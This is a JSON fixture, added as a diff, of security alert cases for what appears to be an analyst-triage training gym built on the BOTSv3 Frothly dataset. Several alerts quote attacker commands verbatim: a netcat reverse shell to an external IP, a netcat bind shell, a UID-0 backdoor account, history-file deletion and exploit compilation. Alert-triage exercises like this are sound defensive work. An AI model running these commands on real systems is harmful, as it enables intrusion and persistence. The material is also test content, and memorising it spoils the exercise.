@@ -1,0 +1,598 @@
+{
+  "schema_version": 2,
+  "event_ref_version": "sha256-object-line-v1",
+  "cases": [
+    {
+      "summary": "S3 bucket public access granted",
+      "description": "An S3 bucket ACL granted public read and write access.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "medium",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "guardduty:s3-public-access",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_13.jsonl.gz",
+        "alert": {
+          "provider": "guardduty",
+          "product": "Amazon GuardDuty",
+          "alert_type": "Policy:S3/BucketAnonymousAccessGranted",
+          "summary": "S3 bucket public access granted",
+          "description": "An S3 bucket ACL granted public read and write access.",
+          "severity": "medium",
+          "resource": "frothlywebcode",
+          "event_time": "2018-08-20 13:01:46",
+          "attributes": {
+            "action": "PutBucketAcl",
+            "bucket": "frothlywebcode",
+            "grantee": "AllUsers",
+            "permissions": [
+              "READ",
+              "WRITE"
+            ]
+          }
+        }
+      }
+    },
+    {
+      "summary": "Endpoint DNS request to cryptocurrency mining domain",
+      "description": "A Frothly endpoint resolved a Coinhive mining destination.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "medium",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "guardduty:ec2-coinminer-dns",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_13.jsonl.gz",
+        "alert": {
+          "provider": "guardduty",
+          "product": "Amazon GuardDuty",
+          "alert_type": "CryptoCurrency:EC2/BitcoinTool.B!DNS",
+          "summary": "Endpoint DNS request to cryptocurrency mining domain",
+          "description": "A Frothly endpoint resolved a Coinhive mining destination.",
+          "severity": "medium",
+          "resource": "BSTOLL-L",
+          "event_time": "2018-08-20 13:38:38",
+          "attributes": {
+            "domain": "ws019.coinhive.com",
+            "source_ip": "192.168.247.131"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Endpoint contacted command-and-control infrastructure",
+      "description": "A PowerShell payload contacted external command-and-control infrastructure.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "guardduty:c2-contact",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_10.jsonl.gz",
+        "alert": {
+          "provider": "guardduty",
+          "product": "Amazon GuardDuty",
+          "alert_type": "Backdoor:EC2/C&CActivity.B!DNS",
+          "summary": "Endpoint contacted command-and-control infrastructure",
+          "description": "A PowerShell payload contacted external command-and-control infrastructure.",
+          "severity": "high",
+          "resource": "45.77.53.176",
+          "event_time": "2018-08-20 10:07:03",
+          "attributes": {
+            "remote_ip": "45.77.53.176",
+            "remote_port": 443,
+            "path": "/admin/get.php"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Runtime cryptocurrency miner behavior",
+      "description": "A browser process reached 100 percent CPU immediately before Coinhive DNS activity.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "wiz_defend:coinminer-runtime",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_13.jsonl.gz",
+        "alert": {
+          "provider": "wiz",
+          "product": "Wiz Defend",
+          "alert_type": "wiz.defend",
+          "summary": "Runtime cryptocurrency miner behavior",
+          "description": "A browser process reached 100 percent CPU immediately before Coinhive DNS activity.",
+          "severity": "high",
+          "resource": "BSTOLL-L",
+          "event_time": "2018-08-20 13:37:50",
+          "attributes": {
+            "process": "chrome#5",
+            "cpu_percent": 100,
+            "domain": "ws019.coinhive.com"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Runtime command execution with external C2",
+      "description": "A command executed through the Struts application opened a reverse shell to an external host.",
+      "status": "new",
+      "priority": "high",
+      "severity": "critical",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "wiz_defend:linux-rce-c2",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_11.jsonl.gz",
+        "alert": {
+          "provider": "wiz",
+          "product": "Wiz Defend",
+          "alert_type": "wiz.defend",
+          "summary": "Runtime command execution with external C2",
+          "description": "A command executed through the Struts application opened a reverse shell to an external host.",
+          "severity": "critical",
+          "resource": "hoth",
+          "event_time": "2018-08-20 11:13:58",
+          "attributes": {
+            "application_path": "/frothlyinventory/showcase.action",
+            "command": "/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe",
+            "remote_ip": "45.77.53.176"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Linux exploit source staged and compiled",
+      "description": "Exploit source was created and compiled on the compromised Linux host.",
+      "status": "new",
+      "priority": "high",
+      "severity": "critical",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "wiz_vulnerability:linux-cves",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_11.jsonl.gz",
+        "alert": {
+          "provider": "wiz",
+          "product": "Wiz Vulnerability",
+          "alert_type": "wiz.vulnerability",
+          "summary": "Linux exploit source staged and compiled",
+          "description": "Exploit source was created and compiled on the compromised Linux host.",
+          "severity": "critical",
+          "resource": "hoth",
+          "event_time": "2018-08-20 11:13:58",
+          "attributes": {
+            "source_path": "/tmp/colonel.c",
+            "compile_command": "gcc colonel.c -o colonelnew"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Public cloud storage exposed",
+      "description": "An S3 bucket ACL grants public read and write access.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "wiz_issue:public-s3-exposure",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_13.jsonl.gz",
+        "alert": {
+          "provider": "wiz",
+          "product": "Wiz Issue",
+          "alert_type": "wiz.issue",
+          "summary": "Public cloud storage exposed",
+          "description": "An S3 bucket ACL grants public read and write access.",
+          "severity": "high",
+          "resource": "frothlywebcode",
+          "event_time": "2018-08-20 13:01:46",
+          "attributes": {
+            "action": "PutBucketAcl",
+            "bucket": "frothlywebcode",
+            "grantee": "AllUsers",
+            "permissions": [
+              "READ",
+              "WRITE"
+            ]
+          }
+        }
+      }
+    },
+    {
+      "summary": "Linux history file cleared",
+      "description": "Root removed the Tomcat user's shell-history file on the compromised host.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "medium",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "defender_cloud:linux-history-cleared",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_11.jsonl.gz",
+        "alert": {
+          "provider": "defender_cloud",
+          "product": "Microsoft Defender for Cloud",
+          "alert_type": "A history file has been cleared",
+          "summary": "Linux history file cleared",
+          "description": "Root removed the Tomcat user's shell-history file on the compromised host.",
+          "severity": "medium",
+          "resource": "hoth",
+          "event_time": "2018-08-20 11:48:17.180",
+          "attributes": {
+            "user": "root",
+            "command": "rm /usr/share/tomcat8/.bash_history"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Suspicious Linux network activity",
+      "description": "A command executed through the web application opened a reverse shell.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "defender_cloud:linux-suspicious-network",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_11.jsonl.gz",
+        "alert": {
+          "provider": "defender_cloud",
+          "product": "Microsoft Defender for Cloud",
+          "alert_type": "Detected suspicious network activity",
+          "summary": "Suspicious Linux network activity",
+          "description": "A command executed through the web application opened a reverse shell.",
+          "severity": "high",
+          "resource": "hoth",
+          "event_time": "2018-08-20 11:13:58",
+          "attributes": {
+            "command": "/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe",
+            "remote_ip": "45.77.53.176",
+            "remote_port": 8088
+          }
+        }
+      }
+    },
+    {
+      "summary": "Suspicious OneDrive link file upload",
+      "description": "The alert claims that a suspicious LNK file was uploaded to OneDrive.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:m365-onedrive-lnk-upload",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_10.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Suspicious OneDrive Link File Upload",
+          "summary": "Suspicious OneDrive link file upload",
+          "description": "The alert claims that a suspicious LNK file was uploaded to OneDrive.",
+          "severity": "high",
+          "resource": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk",
+          "event_time": "2018-08-20 09:59:18",
+          "attributes": {
+            "claimed_operation": "FileUploaded",
+            "file_name": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Unusual Microsoft 365 user agent",
+      "description": "A successful cloud login used an unusual browser from an external address.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "low",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:m365-onedrive-unusual-user-agent",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_00.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_00.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Unusual Microsoft 365 User Agent",
+          "summary": "Unusual Microsoft 365 user agent",
+          "description": "A successful cloud login used an unusual browser from an external address.",
+          "severity": "low",
+          "resource": "bgist@froth.ly",
+          "event_time": "2018-08-20 09:51:37",
+          "attributes": {
+            "user": "bgist@froth.ly",
+            "source_ip": "104.207.83.63",
+            "user_agent": "NaenaraBrowser/3.5b4"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Suspicious link file used",
+      "description": "An anonymous user accessed the malicious LNK through OneDrive.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "medium",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:m365-link-file-used",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_10.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Suspicious Link File Accessed",
+          "summary": "Suspicious link file used",
+          "description": "An anonymous user accessed the malicious LNK through OneDrive.",
+          "severity": "medium",
+          "resource": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk",
+          "event_time": "2018-08-20 09:59:18",
+          "attributes": {
+            "operation": "AnonymousLinkUsed",
+            "file_name": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk",
+            "client_ip": "91.207.175.56"
+          }
+        }
+      }
+    },
+    {
+      "summary": "External mailbox forwarding rule",
+      "description": "A user created an enforced blind-copy rule to an external mailbox.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:m365-inbox-rule-forward-external",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_11.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "External Mail Forwarding Rule",
+          "summary": "External mailbox forwarding rule",
+          "description": "A user created an enforced blind-copy rule to an external mailbox.",
+          "severity": "high",
+          "resource": "hyunki1984@naver.com",
+          "event_time": "2018-08-20 11:21:40",
+          "attributes": {
+            "actor": "fyodor@froth.ly",
+            "operation": "New-TransportRule",
+            "name": "SOX",
+            "blind_copy_to": "hyunki1984@naver.com",
+            "source_ip": "199.66.91.253"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Sensitive mail search terms",
+      "description": "A compromised cloud user searched all mailboxes for sensitive business terms.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "medium",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:m365-sensitive-mail-search",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_11.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Suspicious Mail Search Terms",
+          "summary": "Sensitive mail search terms",
+          "description": "A compromised cloud user searched all mailboxes for sensitive business terms.",
+          "severity": "medium",
+          "resource": "fyodor@froth.ly",
+          "event_time": "2018-08-20 10:48:28",
+          "attributes": {
+            "operation": "New-MailboxSearch",
+            "query": "cromdale OR beer OR financial OR secret",
+            "source_ip": "104.207.83.63"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Azure AD account disabled",
+      "description": "A compromised user successfully disabled another Frothly account.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "low",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:m365-aad-account-disabled",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_14.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_14.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Azure AD Account Disabled",
+          "summary": "Azure AD account disabled",
+          "description": "A compromised user successfully disabled another Frothly account.",
+          "severity": "low",
+          "resource": "bgist@froth.ly",
+          "event_time": "2018-08-20 14:47:12.515",
+          "attributes": {
+            "actor": "fyodor@froth.ly",
+            "target": "bgist@froth.ly",
+            "property": "AccountEnabled",
+            "old_value": true,
+            "new_value": false
+          }
+        }
+      }
+    },
+    {
+      "summary": "Internet password spray against a Frothly server",
+      "description": "An external host attempted multiple invalid SSH usernames against a Frothly server.",
+      "status": "new",
+      "priority": "medium",
+      "severity": "medium",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:web-password-spray",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_15.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_15.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Internet Password Spray",
+          "summary": "Internet password spray against a Frothly server",
+          "description": "An external host attempted multiple invalid SSH usernames against a Frothly server.",
+          "severity": "medium",
+          "resource": "5.101.40.81",
+          "event_time": "2018-08-20 15:07:01.070",
+          "attributes": {
+            "source_ip": "5.101.40.81",
+            "service": "ssh",
+            "usernames": [
+              "camera",
+              "default"
+            ]
+          }
+        }
+      }
+    },
+    {
+      "summary": "Suspicious process spawned from macro document",
+      "description": "The alert claims that HxTsr.exe was spawned from a macro-enabled document.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:endpoint-hxtsr-from-macro",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-18_15.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-18_15.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Suspicious Process From Macro Document",
+          "summary": "Suspicious process spawned from macro document",
+          "description": "The alert claims that HxTsr.exe was spawned from a macro-enabled document.",
+          "severity": "high",
+          "resource": "HxTsr.exe",
+          "event_time": "2018-08-18 15:03:10.484",
+          "attributes": {
+            "process": "HxTsr.exe",
+            "claimed_parent": "macro-enabled Office document"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Endpoint network scan tool",
+      "description": "A compromised endpoint launched hdoor.exe across an internal address range.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:endpoint-hdoor-network-scan",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_10.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Endpoint Network Scan Tool",
+          "summary": "Endpoint network scan tool",
+          "description": "A compromised endpoint launched hdoor.exe across an internal address range.",
+          "severity": "high",
+          "resource": "hdoor.exe",
+          "event_time": "2018-08-20 10:43:11",
+          "attributes": {
+            "host": "FYODOR-L",
+            "process": "hdoor.exe",
+            "arguments": "-hbs 192.168.9.1-192.168.9.50 /b /m /n",
+            "parent": "powershell.exe",
+            "md5": "586EF56F4D8963DD546163AC31C865D7"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Netcat listener on unusual port",
+      "description": "A root-owned Netcat process exposed a shell on TCP port 1337.",
+      "status": "new",
+      "priority": "high",
+      "severity": "high",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:linux-netcat-listener",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-18_12.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-18_12.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Netcat Listener On Unusual Port",
+          "summary": "Netcat listener on unusual port",
+          "description": "A root-owned Netcat process exposed a shell on TCP port 1337.",
+          "severity": "high",
+          "resource": "hoth:1337",
+          "event_time": "2018-08-18 12:29:11.036",
+          "attributes": {
+            "pid": 14356,
+            "process": "netcat",
+            "arguments": "-v -l -p 1337 -e /bin/bash"
+          }
+        }
+      }
+    },
+    {
+      "summary": "Linux UID 0 user created",
+      "description": "A remote command created a new Linux account with UID and GID zero.",
+      "status": "new",
+      "priority": "high",
+      "severity": "critical",
+      "payload": {
+        "gym_id": "002",
+        "alert_id": "sigma:linux-uid0-user-created",
+        "event_ref_version": "sha256-object-line-v1",
+        "event_object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "event_object_url": "http://minio:9000/botsv3/botsv3_2018-08-20_11.jsonl.gz",
+        "alert": {
+          "provider": "sigma",
+          "product": "SIEM Sigma",
+          "alert_type": "Linux UID 0 User Created",
+          "summary": "Linux UID 0 user created",
+          "description": "A remote command created a new Linux account with UID and GID zero.",
+          "severity": "critical",
+          "resource": "tomcat7",
+          "event_time": "2018-08-20 11:07:01",
+          "attributes": {
+            "command": "useradd -ou 0 -g 0 -M -N -r -s /bin/bash tomcat7",
+            "uid": 0,
+            "gid": 0
+          }
+        }
+      }
+    }
+  ]
+}
